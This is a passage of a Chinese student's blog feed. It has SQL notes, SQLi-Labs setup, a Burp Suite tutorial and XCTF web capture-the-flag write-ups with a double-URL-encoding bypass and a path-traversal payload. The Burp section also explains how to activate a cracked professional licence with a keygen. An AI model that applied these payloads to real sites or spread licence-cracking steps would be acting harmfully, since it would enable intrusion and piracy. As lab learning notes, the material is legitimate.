title="数据类型"></a>数据类型</h2><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>数据类型</td><td>大小(字节)</td><td>用途</td><td>格式</td></tr><tr><td>INT</td><td>4</td><td>整数</td><td></td></tr><tr><td>FLOAT</td><td>4</td><td>单精度浮点数</td><td></td></tr><tr><td>DOUBLE</td><td>8</td><td>双精度浮点数</td><td></td></tr><tr><td>ENUM</td><td>–</td><td>单选,比如性别</td><td>ENUM(‘a’,’b’,’c’)</td></tr><tr><td>SET</td><td>–</td><td>多选</td><td>SET(‘1’,’2’,’3’)</td></tr><tr><td>DATE</td><td>3</td><td>日期</td><td>YYYY-MM-DD</td></tr><tr><td>TIME</td><td>3</td><td>时间点或持续时间</td><td>HH:MM:SS</td></tr><tr><td>YEAR</td><td>1</td><td>年份值</td><td>YYYY</td></tr><tr><td>CHAR</td><td>0~255</td><td>定长字符串</td><td></td></tr><tr><td>VARCHAR</td><td>0~255</td><td>变长字符串</td><td></td></tr><tr><td>TEXT</td><td>0~65535</td><td>长文本数据</td><td></td></tr></tbody></table><p>整数除了 INT 外，还有 TINYINT、SMALLINT、MEDIUMINT、BIGINT。</p><p>CHAR 长度固定，VARCHAR 长度可变，VARCHAR长度==具体分配的字符串长度</p><p>CHAR, VARCHAR,TEXT,DATE,TIME,ENUM 等类型的数据需要用单引号修饰</p><p>详细介绍：</p><ul><li><a href="http://blog.csdn.net/anxpp/article/details/51284106#comments">MySQL 中的数据类型介绍</a></li><li><a href="http://www.cnblogs.com/bukudekong/archive/2011/06/27/2091590.html">MySQL 数据类型</a></li></ul><br/><h2 id="SQL常见约束"><a href="#SQL常见约束" class="headerlink" title="SQL常见约束"></a>SQL常见约束</h2><table><thead><tr><th>约束类型：</th><th>主键</th><th>默认值</th><th>唯一</th><th>外键</th><th>非空</th></tr></thead><tbody><tr><td>关键字：</td><td>PRIMARY KEY</td><td>DEFAULT</td><td>UNIQUE</td><td>FOREIGN KEY</td><td>NOT NULL</td></tr></tbody></table><br/><h2 id="其他基本操作"><a href="#其他基本操作" class="headerlink" title="其他基本操作"></a>其他基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">索引：</span><br><span class="line"></span><br><span class="line">视图：</span><br><span class="line"></span><br><span class="line">导入和导出：</span><br><span class="line"></span><br><span class="line">备份和恢复：</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h1 id="SQLi-Labs"><a href="#SQLi-Labs" class="headerlink" title="SQLi-Labs"></a>SQLi-Labs</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.fujieace.com/penetration-test/sqli-labs-ec.html">SQLi-Labs下载、安装（环境搭建）教程 - 付杰博客 (fujieace.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/wwt260/article/details/116885452">sqli-labs安装教程_wwt260的博客-CSDN博客</a></p><br/><p>首先，在  <a href="https://github.com/Audi-1/sqli-labs">GitHub - Audi-1/sqli-labs</a>  上下载压缩的sqli-labs文件</p><p><img src="image-20220215202111964.png" alt="image-20220215202111964"></p><br/><p>其次，在  <a href="https://www.xp.cn/">www.xp.cn</a>  找到以下界面下载 phpStudy 做前期准备</p><p><img src="image-20220215202329165.png" alt="image-20220215202329165"></p><br/><p>phpStudy安装好后，找到WWW目录，将sqli-labs文件解压至WWW目录</p><p><img src="image-20220215202745379.png" alt="image-20220215202745379"></p><br/><p>之后进入以下两个目录找到该.inc文件，将$dbpass的值从空字符串改成 ‘root’ 即可</p><p><img src="image-20220215203057013.png" alt="image-20220215203057013"></p><br/><p>最后调配 phpStudy ，打开MySQL与Apache</p><p><img src="image-20220215203827439.png" alt="image-20220215203827439"></p><p>软件管理中下载php5.4.45nts并将下图中php版本调配到php5.4.45nts</p><p><img src="image-20220215204749877.png" alt="image-20220215204749877"></p><br/><p>注：若不修改php版本为5.4.45，则会遇到如下报错：</p><p><img src="image-20220215204445997.png" alt="image-20220215204445997"></p><br/><p>完成以上步骤后，进入网页中输入 <a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> ，点击Setup/reset Database for labs</p><p><img src="image-20220215205118928.png" alt="image-20220215205118928"></p><br/><p>显示以下界面说明调配成功，可以开始你的SQL手工注入学习之旅了</p><p><img src="image-20220215205237256.png" alt="image-20220215205237256"></p><br/><p>回到  <a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a>  ,查看第一题是什么样的</p><p><img src="image-20220215205453686.png" alt="image-20220215205453686"></p><p>好了，开始做题吧 ^_^</p><p><img src="image-20220215205556248.png" alt="image-20220215205556248"></p><br/><br/><h1 id="MarkDown"><a href="#MarkDown" class="headerlink" title="MarkDown"></a>MarkDown</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;学习链接：<a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法 | Markdown 官方教程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">个人用到过的：</span><br><span class="line"># &lt;center&gt; 一级标题    #居中，一级标题前加入&lt;center&gt; 即可完成居中</span><br><span class="line">&lt;br/&gt;                 #换行</span><br><span class="line">&amp;nbsp;                #空格</span><br><span class="line">&lt;font color=&quot;Blue&quot;&gt;Test&lt;/font&gt;     #修改字体颜色为蓝色</span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br></pre></td></tr></table></figure><br/><br/><h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>因为老师要求各类软件，导致无法将博客同步至网上，便找到了一个帮我解决了问题的博客</p><p>链接：<a href="https://blog.csdn.net/qq_36759224/article/details/100411949">(完美解决 bash: hexo: command not found_BOB’S BLOG-CSDN博客</a></p><h1 id="网站构建"><a href="#网站构建" class="headerlink" title="网站构建"></a>网站构建</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;学习链接：<a href="https://www.w3school.com.cn/site/index.asp">网站构建教程 (w3school.com.cn)</a></p><br/><br/><h1 id="学-amp-录"><a href="#学-amp-录" class="headerlink" title="学&amp;录"></a>学&amp;录</h1><h2 id="推荐书籍："><a href="#推荐书籍：" class="headerlink" title="推荐书籍："></a>推荐书籍：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基础类：《图解HTTP》*、《图解TCP/IP》*、《网络是怎样连接的》、《MySQL必知必会》、</span><br><span class="line">      《图解密码技术》......</span><br><span class="line"></span><br><span class="line">进阶类：《白帽子讲web安全》、《CTF特训营》、《程序员的自我修养》、《CTF权威指南》......</span><br></pre></td></tr></table></figure><h2 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h2><p>链接：<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p><p>链接(pwn)：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><p>链接(pwn)：<a href="http://pwnable.kr/">http://pwnable.kr/</a></p><p>链接：<a href="https://www.lanqiao.cn/">蓝桥云课 (lanqiao.cn)</a></p><p>链接：<a href="https://www.hetianlab.com/">合天网安实验室 (hetianlab.com)</a></p><p>链接：<a href="https://www.w3school.com.cn/index.html">w3school 在线教程</a></p><p>链接(课内)：<a href="https://www.xuetangx.com/">https://www.xuetangx.com/</a></p><p>链接：<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><p>链接(一个神奇的网站)：<a href="https://msdn.itellyou.cn/">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a></p><br/><h2 id="HTML："><a href="#HTML：" class="headerlink" title="HTML："></a>HTML：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.bilibili.com/video/BV11t411K74Q?share_source=copy_web">https://www.bilibili.com/video/BV11t411K74Q?share_source=copy_web</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.w3school.com.cn/html/index.asp">https://www.w3school.com.cn/html/index.asp</a></p><br/><h2 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a>PHP：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.bilibili.com/video/BV1Vp4y1e7pz">https://www.bilibili.com/video/BV1Vp4y1e7pz</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.w3school.com.cn/php/index.asp">PHP 教程 (w3school.com.cn)</a></p><br/><h2 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL:"></a>MySQL:</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.lanqiao.cn/courses/9">MySQL 基础课程_MySQL - 蓝桥云课 (lanqiao.cn)</a></p><br/><h2 id="NISP"><a href="#NISP" class="headerlink" title="NISP"></a>NISP</h2><p>链接：<a href="https://pan.baidu.com/s/1v65ypJ0d0fbryLu6QDw-DA?pwd=xxxy"><strong>nisp一级题库</strong></a></p><p>来源链接：<a href="https://blog.csdn.net/weixin_43931875/article/details/108005695">https://blog.csdn.net/weixin_43931875/article/details/108005695</a></p><br/><p><br/>啥也不会__╭(°A°`)╮__</p><br/><br/><h1 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h1><p>GPS劫持：<a href="https://toutiao.io/posts/uax8a1p/preview">https://toutiao.io/posts/uax8a1p/preview</a></p><p><a href="https://blog.csdn.net/xiaoi123/article/details/79218575">(1条消息) GPS欺骗（一）—无人机的劫持_xiaoi123的博客-CSDN博客_gps欺骗</a></p><p><strong>GPS相关内容推荐：</strong></p><p><a href="https://bbs.ichunqiu.com/thread-26651-1-1.html?from=csdn"><strong>1、 HTML5之GPS定位保存【附源码】</strong>  </a></p><p><a href="https://bbs.ichunqiu.com/thread-25476-1-1.html?from=csdn"><strong>2、源码分享：代码完结一款多用户Gps定位平台</strong>  </a></p><p><strong><a href="https://bbs.ichunqiu.com/thread-14209-1-1.html?from=beef">3、</a><a href="https://bbs.ichunqiu.com/thread-14209-1-1.html?from=csdn">克里姆林宫疑似开启GPS干扰器：当地民众定位异常</a></strong>   <a href="https://www.ichunqiu.com/course/54917?from=beef">**<br>**</a></p><p><a href="https://www.ichunqiu.com/course/54917?from=csdn"><strong>4、时空线索——Hack Key 邂逅 GPS——袁舰、张婉桥</strong>  </a></p><br/><p><a href="https://www.ichunqiu.com/zhihu?from=csdn">你想了解的炫酷白帽黑客技能都在这！【i春秋】 (ichunqiu.com)</a></p><br/><p><a href="https://www.fujieace.com/">付杰博客 - 专注“IT/互联网“领域，主攻”PHP编程+渗透测试“技术 (fujieace.com)</a></p><br/><p><a href="https://www.const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/">https://www.const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/</a></p>]]></content>
    
    
    <summary type="html">xiaoxiaoxy的一知半解</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Burp Suite_专业版</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/01/27/Burp-Suite-%E4%B8%93%E4%B8%9A%E7%89%88/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/01/27/Burp-Suite-%E4%B8%93%E4%B8%9A%E7%89%88/</id>
    <published>2022-01-27T08:10:16.000Z</published>
    <updated>2022-01-27T08:48:37.709Z</updated>
    
    <content type="html"><![CDATA[<br/><p>原文链接：<a href="https://www.cnblogs.com/zewutest/p/13895187.html">Burp_suite安装及使用教程(专业版) - 停泊2019 - 博客园 (cnblogs.com)</a></p><p>因为担心博主删除博文，在此copy一份原博文。（注：本文在以上文章的内容基础上有稍作添加）</p><br/><h1 id="Burp-suite安装及使用教程-专业版"><a href="#Burp-suite安装及使用教程-专业版" class="headerlink" title="Burp_suite安装及使用教程(专业版)"></a><a href="https://www.cnblogs.com/zewutest/p/13895187.html">Burp_suite安装及使用教程(专业版)</a></h1><p>1、工具下载地址：</p><p><a href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip">https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip</a></p><br/><p>工具运行需要Java环境，请自行安装，此处不赘述。（注：检测java环境是否安装完成：cmd中输入java -version 、 java 、 javac 几个命令观察返回信息）</p><p><img src="image-20220127161805395.png" alt="image-20220127161805395"></p><br/><p>解压完成后右击burp-loader-keygen.jar，以Java(TM) Platform SE binary的方式打开keygen</p><p><img src="image-20220127163321039.png" alt="image-20220127163321039"></p> <br/><p>2、修改License Text为任意值</p><p><img src="image-20220127163347339.png" alt="image-20220127163347339"></p> <br/><p>3、点击run启动burpsuite</p><p><img src="image-20220127163406354.png" alt="image-20220127163406354"></p> <br/><p>4、如果上述方式没有成功启动burpsuite，打开cmd，进入burp-loader-keygen.jar所在目录，执行命令：java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar</p><p><img src="image-20220127163425538.png" alt="image-20220127163425538"></p> <br/><p>5、打开burpsuite成功</p><p><img src="image-20220127163452793.png" alt="image-20220127163452793"></p> <br/> <br/><p>6、将Keygen中License复制粘贴到burpsuite中</p><p><img src="image-20220127163509625.png" alt="image-20220127163509625"></p> <br/><p>点击Next</p><p><img src="image-20220127163523681.png" alt="image-20220127163523681"></p> <br/><br/>7、然后点击Manual activation<p><img src="image-20220127163535688.png" alt="image-20220127163535688"></p> <br/><p>8、点击Copy request</p><p><img src="image-20220127163548330.png" alt="image-20220127163548330"></p> <br/><p>9、点击Copy request，复制完成之后，将字符串粘贴到keygen的Activation Request框里，然后Activation Response框里就有了结果，如下</p><p><img src="image-20220127163559696.png" alt="image-20220127163559696"></p> <br/><p>10、复制完后，将字符串粘贴到BurpSuite剩下的那个框里，如图，再点击Next显示激活成功</p><p><img src="image-20220127163616907.png" alt="image-20220127163616907"></p> <br/><p>11、再点击Next显示激活成功</p><p><img src="image-20220127163631335.png" alt="image-20220127163631335"></p> <br/><p>注：若出现以下情况，点击Delete即可</p><p><img src="image-20220127164816372.png" alt="image-20220127164816372"></p><br/><p>然后点击Next</p><p><img src="image-20220127163644656.png" alt="image-20220127163644656"></p><br/><p>再点击Start Burp</p><p><img src="image-20220127163700289.png" alt="image-20220127163700289"></p> <br/><p>12、burpsuite主界面</p><p><img src="image-20220127163712299.png" alt="image-20220127163712299"></p> <br/><p>13、激活之后，不能通过双击BurpSuite主程序来启动，否则启动之后还是需要输入key，两个文件必须放在一个目录下，启动方式有两种：</p><p>通过 keygen 上的 run 按钮来启动（注：本人无法通过此方法打开BurpSuite专业版）</p><p>在文件目录下执行java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar来启动.为了方便，可以将命令保存为一个bat</p><br/><p>注：bat方法：</p><p>1、当前目录下新建txt文本文档：</p><p><img src="image-20220127162213250.png" alt="image-20220127162213250"></p><p>2、将以下指令写入新建文本文档中，点击另存为另存至当前目录，相关配置数据按下图修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar</span><br></pre></td></tr></table></figure><p><img src="image-20220127162444943.png" alt="image-20220127162444943"></p><p>3、创建快捷方式拖动到桌面即可在桌面打开BurpSuite专业版</p><p><img src="image-20220127162854533.png" alt="image-20220127162854533"></p><br/><br/><p>Burpsuite神奇常用功能使用方法总结</p><p>Burpsuite介绍：</p><p>一款可以进行再WEB应用程序的集成攻击测试平台。(抓https要在浏览器中导入证书)</p><p>1、学习Proxy</p><p><img src="image-20220127163756552.png" alt="image-20220127163756552"></p> <br/><p>首先看标红，intercept is on 为拦截状态 其对应的intercept is off 为非拦截状态,设置完代理后打开拦截状态，浏览器发起的请求会被burpsuite所拦截</p><p><img src="image-20220127163811582.png" alt="image-20220127163811582"></p> <br/><p>forward: 进行请求后被拦截，点击forward可以继续此次请求，如果你点击drop则丢弃此请求数据。继续请求后能够看到返回结果</p><p><img src="image-20220127163825565.png" alt="image-20220127163825565"></p> <br/><p>可以在消息分析选项卡查看这次请求的所有内容</p><p>1）Raw 这个视图主要显示web请求的raw格式，包含请求地址， http协议版本， 主机头， 浏览器信息，accept可接受的内容类型，字符集，编码方式，cookies等,  可以手动修改这些内容，然后在点击forward进行渗透测试</p><p>2） params 这个视图主要是显示客户端请求的参数信息，get或者post的参数，cookies参数，也可以修改</p><p>3）headers是头部信息和Raw其实差不多，展示更直观</p><p>4）Hex 这个视图显示Raw的二进制内容</p> <br/><p>注意： 默认情况下，BurpProxy只拦截请求的消息，普通的文件如css,js,图片是不会拦截的，当然，想拦截什么都可以设置,我们现在知道了怎么设置代理，怎么安装，怎么进行请求拦截，怎么修改请求发起的内容向服务端进行渗透，接下来我们学习一下怎么控制这些拦截</p><p> <img src="image-20220127163841642.png" alt="image-20220127163841642"></p> <br/> <br/><p>上图为http history 所有拦截的历史均会被记录起来</p><p> <img src="image-20220127163850360.png" alt="image-20220127163850360"></p> <br/> <br/><p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action构成，它们的功能分别是： Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。 Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。 Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。                                                      </p><p>2、burpsuite使用（抓包、截包、改包）</p><p>这里推荐火狐浏览器来配合burp使用。</p><p>1）设置浏览器</p><p>工具-选项-网络设置-设置，将连接设置改为手动代理配置</p><p><img src="image-20220127163903949.png" alt="image-20220127163903949"></p> <br/><p>输入127.0.0.1:8080，点击回车，进入burp证书下载页面</p><p> <img src="image-20220127163911979.png" alt="image-20220127163911979"></p> <br/><p>点击右上角，下载证书</p><p> <img src="image-20220127163919813.png" alt="image-20220127163919813"></p> <br/><p>在选项里搜索证书，点击【查看证书】</p><p> <img src="image-20220127163927300.png" alt="image-20220127163927300"></p> <br/><p>点击【导入】，导入刚刚下载的burp证书，这样就可以使用burp抓取https请求了</p><p> <img src="image-20220127163934098.png" alt="image-20220127163934098"></p> <br/><p>这时候计算机上的火狐浏览器也设置为了代理模式。代理设置成功之后，访问网页是访问不了的，因为我们没有将请求转发，接下来就需要配置burp来转发浏览器的请求。</p><p>2）配置burp监听端口</p><p>然后打开burp</p><p> <img src="image-20220127163942277.png" alt="image-20220127163942277"></p> <br/><p>在监听的端口设置与代理的端口相同</p><p>3）抓包</p><p> 将burp设置为Intercept is on，在火狐浏览器里输入baike.baidu.com</p><p> <img src="image-20220127163950066.png" alt="image-20220127163950066"></p> <br/><p>将Intercept is on设置为Intercept is off</p><p> <img src="image-20220127163957634.png" alt="image-20220127163957634"></p> <br/> <br/><p>4）截包</p><p>这时候就需要打开拦截功能了</p><p>之前在抓包的时候可以看到，百度搜索一次要发送很多个请求，这个时候停留在第一个请求上面，这时候，如果不听地点击forward的话，就会一直发送接下来的请求。如果不停点击drop，就会把这些请求的包一个个丢掉。</p><p>5）改包</p><p>比如水果网<a href="http://www.guo68.com/%E6%90%9C%E7%B4%A2%E6%B0%B4%E6%9E%9C%EF%BC%9Apingguo%EF%BC%88%E6%90%9C%E7%B4%A2%E4%B8%AD%E6%96%87%E7%9A%84%E6%97%B6%E5%80%99%E6%8A%93%E7%9A%84%E5%8C%85%E6%98%AF%E4%B9%B1%E7%A0%81%EF%BC%8C%E4%B8%8D%E5%88%A9%E8%A7%82%E5%AF%9F%EF%BC%89">http://www.guo68.com/搜索水果：pingguo（搜索中文的时候抓的包是乱码，不利观察）</a></p><p>一直点击forward，并且查看params选项，直到参数的内容中出现pingguo</p><p> <img src="image-20220127164045075.png" alt="image-20220127164045075"></p> <br/><p>这时候把pingguo改成putao，继续点击forward或者关闭拦截功能。</p><p> <img src="image-20220127164053203.png" alt="image-20220127164053203"></p> <br/><p>便会搜索putao了。</p>]]></content>
    
    
    <summary type="html">安装教程</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-Web</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/01/21/Web-%E8%BF%9B%E9%98%B6/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/01/21/Web-%E8%BF%9B%E9%98%B6/</id>
    <published>2022-01-21T05:42:58.000Z</published>
    <updated>2022-02-17T07:33:18.474Z</updated>
    
    <content type="html"><![CDATA[<br/><h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>链接（题解）：<a href="https://blog.csdn.net/Catherine_qingzhu/article/details/105335243">https://blog.csdn.net/Catherine_qingzhu/article/details/105335243</a></p><br/><p>对于初始页面，查询到以下资料：</p><p>Apache服务器的默认首页（初始页面）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex index.php index.html</span><br><span class="line">或</span><br><span class="line">DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm</span><br></pre></td></tr></table></figure><p>链接：<a href="https://www.php.cn/apache/441264.html">配置Apache服务器的默认首页-Apache-PHP中文网</a></p><p>链接：<a href="https://blog.csdn.net/zhang44429824/article/details/80002105">关于配置Apache网站根目录以及默认页面_zhang44429824的博客-CSDN博客_apache默认网站根目录</a></p><br/><p>本题的flag隐藏在请求   URL/index.php   这一资源后服务器返回的响应报文的报文首部中。</p><p><img src="image-20220121141900584.png" alt="image-20220121141900584"></p><p>收获：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1、了解到响应报文的报文首部中可以隐藏一些有用的信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2、重新回顾了一下《图解HTTP》56页的知识，对301、302状态码有了更深一步的认识。</p><br/><br/><h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>Robots协议，与新手区的robots解题过程相似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL/robots.txt</span><br><span class="line">URL/fl0g.php</span><br><span class="line">cyberpeace&#123;76f058b55f56b5f5b05fb69fe2ff8de6&#125;</span><br></pre></td></tr></table></figure><br/><br/><h4 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h4><p>御剑工具下载：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/hackzkaq/article/details/110053457">后台扫描工具 - 御剑（珍藏版）附下载_hackzkaq的博客-CSDN博客_御剑扫描</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;注：以后这类软件，下载的时候若担心植入过木马病毒，可以装载至虚拟机中</p><p><img src="image-20220201182323211.png" alt="image-20220201182323211"></p><br/><p>.phps文件：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/loseheart157/article/details/108140659">后缀名为.phps的文件_h0ld1rs的博客-CSDN博客_index.phps</a></p><br/><p>解题过程：</p><p><img src="image-20220203110342196.png" alt="image-20220203110342196"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL/index.phps   //别管那么多，加进你的字典就完事了（御剑扫描时用到的字典）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // $_GET[id]：以 GET 方式传入一个名为 id 的变量值，变量值赋给 $_GET[id]</span><br><span class="line">    //若&quot;admin&quot;完全等价于传入值，则执行该if语句内的代码</span><br><span class="line">    if(&quot;admin&quot;===$_GET[id]) &#123;</span><br><span class="line">      echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">      exit();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //将 $_GET[id] 值进行一次 urldecode 解码</span><br><span class="line">    $_GET[id] = urldecode($_GET[id]);</span><br><span class="line">    </span><br><span class="line">    //再次判断，若为真则执行if语句中的代码</span><br><span class="line">    if($_GET[id] == &quot;admin&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因此该题借助 urlencode 编码 &quot;admin&quot; 中任意数量的任意字符即可绕过第一个if判断。</span><br><span class="line">但由于地址栏传入参数id时，浏览器会自动对URL后面的非ASCII码的字符进行一次urlencode</span><br><span class="line">因此我们要进行两次 urlencode 编码</span><br><span class="line">admin-&gt;%61%64%6D%69%6E-&gt;%2561%2564%256D%2569%256E</span><br><span class="line">因此构造payload：URL/?id=%2561%2564%256D%2569%256E</span><br><span class="line">当然，只对一个字符进行两次 urlencode 编码也可 admin-&gt;%61dmin-&gt;%2561dmin</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">地址栏输入：URL/?id=%2561%2564%256D%2569%256E 后自动解码一次</span><br><span class="line">因此第一个if语句的比较判断为：if(&quot;admin&quot;===&quot;%61%64%6D%69%6E&quot;) </span><br><span class="line">之后解码一次：urldecode(%61%64%6D%69%6E)=admin</span><br><span class="line">最后第二个if语句的比较判断为：if(&quot;admin&quot;===&quot;admin&quot;)，从而拿到flag</span><br><span class="line">flag：cyberpeace&#123;91d2e75adf3715a0f492b9864c0eb73a&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220126163200306.png" alt="image-20220126163200306"></p><br/><p>推荐题解：<a href="https://blog.csdn.net/wyj_1216/article/details/95235159">https://blog.csdn.net/wyj_1216/article/details/95235159</a></p><br/><br/><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>解题过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看网页源代码，发现注释中提示的source.php文件</span><br><span class="line">URL/source.php (地址栏IP地址后添加/source.php查看该文件)</span><br><span class="line">代码审计，发现存在另一文件hint.php</span><br><span class="line">URL/hint.php 查看该文件</span><br><span class="line">得到提示--flag位于ffffllllaaaagggg文件中</span><br><span class="line">代码审计</span><br><span class="line">GET方式传参：URL/?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">    (估计四次返回上一级目录（../）后到达根目录，否则输入4个以上的../不会得到flag)</span><br><span class="line">flag：flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</span><br></pre></td></tr></table></figure><p>阅读了大量的题解及相关资料后，记录一下个人观点，因为只是浅学过php的基本语法（还是昨天学的2022/1/22），很多地方的实现细节目前并不了解，只能泛泛而谈，讲个大概。在此也不对php进行深入的了解，先广泛学习，以后再回头来深究，毕竟我还有很多东西得先了解：</p><p>1、审计代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 